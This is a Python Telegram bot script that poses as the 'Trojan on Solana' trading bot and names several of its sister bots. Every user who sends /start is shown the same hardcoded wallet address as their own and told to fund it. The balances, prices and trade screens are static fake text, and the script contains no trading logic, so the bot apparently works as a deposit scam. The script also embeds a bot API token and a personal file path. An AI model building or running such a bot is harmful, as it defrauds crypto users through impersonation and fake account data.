import logging
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update, Bot
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
import os
import asyncio

# Set up logging to monitor errors and debug information
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Function to clear existing webhook (important for resolving conflicts)
async def clear_webhook():
    bot = Bot("7761108718:AAFmR_1ZtMAXX8DBi_r3BCo7418MtK6C1GU")
    await bot.delete_webhook(drop_pending_updates=True)
    logger.info("Webhook cleared.")

# Define the main menu keyboard
def main_menu_keyboard():
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("Buy", callback_data="buy"),
        InlineKeyboardButton("Sell", callback_data="sell"),
    ], [
        InlineKeyboardButton("Positions", callback_data="positions"),
        InlineKeyboardButton("Limit Orders", callback_data="limit_orders"),
    ], [
        InlineKeyboardButton("Referrals", callback_data="referrals"),
        InlineKeyboardButton("Withdraw", callback_data="withdraw"),
    ], [
        InlineKeyboardButton("Copy Trade", callback_data="copy_trade"),
        InlineKeyboardButton("Settings", callback_data="settings"),
    ], [
        InlineKeyboardButton("Help", callback_data="help"),
    ]])

# Function to handle the /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    video_path = "C:/Users/IYOHA ODUTOLA/Documents/new python bot/WhatsApp Video 2024-12-03 at 12.58.12 AM.mp4"

    try:
        if os.path.exists(video_path):
            with open(video_path, 'rb') as video_file:
                await context.bot.send_video(
                    chat_id=update.effective_chat.id,
                    video=video_file,
                    caption="Welcome to Trojan on Solana! 🎥"
                )
        else:
            logger.error(f"Video file not found at {video_path}")
            await update.message.reply_text("Error: Welcome video not available.")
            return
    except Exception as e:
        logger.error(f"Error sending video: {e}")
        await update.message.reply_text("Error: Could not send video.")

    welcome_message = (
        "Introducing a cutting-edge bot crafted exclusively for Solana Traders. "
        "Trade any token instantly right after launch.\n\n"
        "Here's your Solana wallet address linked to your Telegram account. "
        "Simply fund your wallet and dive into trading.\n\n"
        "Solana Wallet Address:\n"
        "AVXRzamEeoLD5vUUwdauK8928KPJ9iFuR163SYh28vy1\n\n"
        "TAP TO COPY\n\n "
        "Balance: (0.00) SOL\n\n"
        "Click on the Refresh button to update your current balance.\n\n"
        "Join our Telegram group @trojan for users of Trojan!\n\n"
        "If you aren't already, we advise that you use any of the following bots to trade with. "
        "You will have the same wallets and settings across all bots, but it will be significantly "
        "faster due to lighter user load.\n\n"
        "@achilles_trojanbot | @odysseus_trojanbot | @Menelaus_trojanbot | "
        "@Diomedes_trojanbot | @Paris_trojanbot | @Helenus_trojanbot | @Hector_trojanbot\n"
    )
    await update.message.reply_text(welcome_message, reply_markup=main_menu_keyboard())

# Function to handle button presses
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()

    if query.data == "buy":
        buy_message = (
            "Buy $SLND- (Solend) 📈\n\n"
            "Share token with your Reflink\n\n"
            "Balance: -_- SOL - W1 ✏️\n\n"
            "Price: $0.3594 - LIQ: $17.48K - MC: $35.94M\n\n"
            "30m: -1.64% - 24h: -5.66%\n\n"
            "Renounced❌\n\n"
            "🔴 Insufficient balance for buy amount + gas."
        )
        await query.edit_message_text(buy_message, reply_markup=main_menu_keyboard())
    
    elif query.data == "sell":
        sell_message = (
            "Sell $SLND- (Solend) 📉\n\n"
            "Share token with your Reflink\n\n"
            "Balance: 2.419 SOL\n\n"
            "Price: $0.3594 - LIQ: $17.48K - MC: $35.94M\n\n"
            "30m: -1.64% - 24h: -5.66%\n\n"
            "Ready to sell? Please confirm the amount."
        )
        await query.edit_message_text(sell_message, reply_markup=main_menu_keyboard())

    elif query.data == "positions":
        positions_message = (
            "Positions Overview:\n\n"
            "You have no active positions currently.\n\n"
            "To open a new position, click 'Buy' or 'Sell' above."
        )
        await query.edit_message_text(positions_message, reply_markup=main_menu_keyboard())
    
    elif query.data == "limit_orders":
        limit_orders_message = (
            "Limit Orders:\n\n"
            "No active limit orders at the moment.\n\n"
            "To place a limit order, click 'Buy' or 'Sell' above."
        )
        await query.edit_message_text(limit_orders_message, reply_markup=main_menu_keyboard())
    
    elif query.data == "referrals":
        referrals_message = (
            "Referrals Overview:\n\n"
            "Invite others and earn rewards for each successful referral!\n\n"
            "Share your referral link below:\n"
            "https://t.me/YourBotUsername?start=your_unique_referral_code"
        )
        await query.edit_message_text(referrals_message, reply_markup=main_menu_keyboard())
    
    elif query.data == "withdraw":
        withdraw_message = (
            "Withdraw funds from your wallet.\n\n"
            "Balance: 2.419 SOL\n\n"
            "To withdraw, please enter the amount you want to transfer."
        )
        await query.edit_message_text(withdraw_message, reply_markup=main_menu_keyboard())

    elif query.data == "copy_trade":
        copy_trade_message = (
            "Copy Trading:\n\n"
            "Follow successful traders and copy their trades automatically.\n\n"
            "Select a trader to copy from the list below."
        )
        await query.edit_message_text(copy_trade_message, reply_markup=main_menu_keyboard())

    elif query.data == "settings":
        settings_message = (
            "Settings Overview:\n\n"
            "Here you can adjust your trading preferences and notifications.\n\n"
            "To update settings, click 'Save' after making changes."
        )
        await query.edit_message_text(settings_message, reply_markup=main_menu_keyboard())

    elif query.data == "help":
        help_message = (
            "Help:\n\n"
            "For assistance, please reach out to our support team.\n\n"
            "You can also visit our FAQ section at: "
            "https://t.me/YourBotUsername/faq"
        )
        await query.edit_message_text(help_message, reply_markup=main_menu_keyboard())

# Function to set up polling and ensure graceful shutdown
async def run_bot():
    await clear_webhook()  # Await the async webhook clearing

    application = Application.builder().token("7761108718:AAFmR_1ZtMAXX8DBi_r3BCo7418MtK6C1GU").build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))

    try:
        await application.run_polling(allowed_updates=Update.ALL_TYPES)
    finally:
        await application.shutdown()  # Properly shut down the bot on exit

# Entry point of the script
if __name__ == "__main__":
    asyncio.run(run_bot())
